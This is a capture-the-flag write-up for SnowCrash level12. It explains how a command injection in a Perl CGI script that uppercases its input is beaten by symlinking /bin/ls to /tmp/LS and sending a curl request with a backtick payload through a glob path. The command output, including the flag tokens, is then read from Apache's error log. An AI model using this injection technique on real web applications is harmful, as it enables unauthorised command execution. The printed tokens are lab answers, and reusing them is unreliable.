# level12

When we started the level we found a level12.pl that you can find in the resources of this exercice.

We can easily have a first thought on where the exploit is. Here again there is a user input with very little sanitizing, which leads us to think that this might be the weak point of this program:

```
`@output = `egrep "^$xx" /tmp/xd 2>&1`;`
```

We tried to make some injections but the regex turns our ls to => LS (everything is changed in caps lock) provoking some errors but nothing interesting for us.

After a full day of research, trying a lot of non working solutions like a malicious egrep, trying to execute code in the file that the code analyzes, analyzing apache2 configuration etc... We thought that maybe we hadn't given everything on this user input solution.

We know that we can find the result in the error file of apache in /var/log/apache2/error.so why not working with it:

```
[Thu Feb 08 13:33:52 2024] [error] [client 127.0.0.1] LS: not found.
```

After this we had the idea to simply make a link between /bin/ls and /tmp/LS, a file that we created, and which is in caps lock, so handy with what this perl code does:

```
ln -s /bin/ls /tmp/LS
```

Then trying to execute curl '127.0.0.1:4646/?x=`/*/ls%3E%262`'.

This worked, we got an LS in the error log of Apache

Do this with getflag and we finally got what we were looking for !

```
level12@SnowCrash:~$ cat /var/log/apache2/error.log
[Thu Feb 08 13:41:20 2024] [error] [client 127.0.0.1] Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

```
/*********************************************************\

flag12@SnowCrash:~$ getflag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

\*********************************************************/
```